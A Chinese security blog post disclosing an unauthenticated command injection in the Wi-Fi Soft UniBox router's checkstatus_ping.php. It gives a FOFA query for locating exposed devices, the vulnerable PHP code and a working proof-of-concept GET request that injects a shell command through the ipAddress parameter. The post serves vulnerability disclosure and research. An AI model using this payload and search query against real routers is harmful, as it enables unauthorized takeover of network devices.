---
title: "Unibox路由器 network/checkstatus_ping.php 命令执行漏洞"
source: https://mrxn.net/jswz/unibox-network-checkstatus_ping-rce.html
asset_dir: assets/unibox路由器-networkcheckstatus_ping.php-命令执行漏洞
---

# Unibox路由器 network/checkstatus\_ping.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/1 08:29
* 1223浏览
* [0评论](#comment)
* 8分钟阅读

深入探索

路由器

软件

ping


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Wifi-soft UniBox controller 路由器产品中存在一个致命漏洞，`/network/checkstatus_ping.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。

网络设备

# 影响版本

# fofa语法

> `body="Unibox" && body="Controller" || body="www.wifi-soft.com"`

# 漏洞分析

深入探索

安全研究工具

安全

企业安全咨询

直接看 `/network/checkstatus_ping.php` 的业务实现造成漏洞的关键部分如下

```
$ipAddress = $_REQUEST['ipAddress'];

function ping($ipAddress) {

    exec("/bin/ping -w 3 $ipAddress -q >/dev/null 2>/dev/null",$output, $result);

        if($result != 0) {
            return 0;
        }
        else {
            return 1;
        }
}

$response = ping($ipAddress);
```

深入探索

网络安全课程

恶意软件分析工具

漏洞扫描器

直接将 `ipAddress` 的值拼接进 `exec` 命令中执行，无任何过滤和校验，因此造成[命令执行](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用

> 支持cookie获取参数，注意检测点，别漏
>
> 网络监控与管理

```
GET /network/checkstatus_ping.php?ipAddress=;set>11.txt; HTTP/1.1
Host: unibox.mrxn.net
```

访问命令执行结果文件 `/network/11.txt`

[![Unibox路由器 network/checkstatus_ping.php 命令执行漏洞](images/img-001-808b96116db6.webp)](https://image.mrxn.net/f73465e16cdb4c748a5ac78eb715e93e.webp)

成功获得 `set` 命令执行的结果

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[Unibox路由器 network/checkstatus\_ping.php 命令执行漏洞](https://mrxn.net/jswz/unibox-network-checkstatus_ping-rce.html)  
文章链接：<https://mrxn.net/jswz/unibox-network-checkstatus_ping-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/unibox-network-checkstatus\_ping-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/unibox-network-checkstatus\_ping-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 